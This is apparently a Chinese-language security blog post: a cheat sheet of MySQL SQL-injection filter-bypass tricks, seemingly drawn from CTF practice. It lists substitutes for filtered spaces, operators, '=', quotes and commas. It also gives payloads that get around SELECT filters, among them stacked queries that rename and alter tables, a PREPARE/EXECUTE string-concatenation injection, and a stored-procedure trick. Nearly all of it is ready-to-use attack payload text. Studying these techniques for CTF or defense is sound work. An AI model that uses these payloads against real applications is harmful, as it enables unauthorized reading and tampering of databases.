---
layout: post
title: sql注入绕过
date: 2023-08-01 10:00:00
description: sql注入绕过
tags: MySQL SQL注入
categories: Web安全
---

# sql注入绕过

### 空格过滤绕过

```sql
/**/ （） %0a ` tap 两个空格
```

### 过滤or and xor not

```sql
and = &&
or = ||
xor = |
not = !
```

### 过滤=

```sql
1.不加通配符的 like rlike
2.使用大小于号
3.使用!<>,<>相当于!=
```

### 过滤大小于号

```sql
1.greatest(n1,n2,n3):返回n中的最大值
select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116;
least同，返回最小值

2.strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1

3.in

4.between


```

### 过滤引号绕过

使用十六进制编码：

```sql
select column_name  from information_schema.tables where table_name=0x7573657273;

```

宽字节：

```sql
用%df'代替，具体见另一页
```

单引号绕过：

当过滤了'时逃逸使用\去掉后一个'将后面password拼接进username中

### 过滤逗号：

```sql
1.select substr("string",1,3);
可替换为：select substr("string" from 1 for 3);#从1开始读3个长度的字符串

2.union select 1,2,3
可用join：union select * from (select 1)a join (select 2)b join(select 3)c
```

### 过滤select：

![](image/image_usDiHlywAT.png)

1.使用handle：

```sql
handler users（表） open as hd; #指定数据表进行载入并将返回句柄重命名
handler hd read first; #读取指定表/句柄的首行数据
handler hd read next; #读取指定表/句柄的下一行数据
handler hd close; #关闭句柄
```

2.使用rename：

```sql
1';
RENAME TABLE `words` TO `words2`;
RENAME TABLE `1919810931114514` TO `words`;
ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#

select * from words where id = ‘$id’;
修改后等同于：
select * from 1919810931114514 where flag = ‘$id’;
select * from 1919810931114514 where flag = ' 1' or 1=1#

```

3.MySQL预处理：

```sql
1';PREPARE st from concat('s','elect', ' * from `1919810931114514` ');EXECUTE st;#
#prepare后接语句，所以可以使用字符串操作，拼接等
```

```sql
DELIMITER $$
create procedure fuck(out oo text(999), in ii text(999))
BEGIN
set oo = ii;
END$$
call fuck(@a, 0x73656C656374202731323327)$$
prepare b from @a$$
execute b$$
```
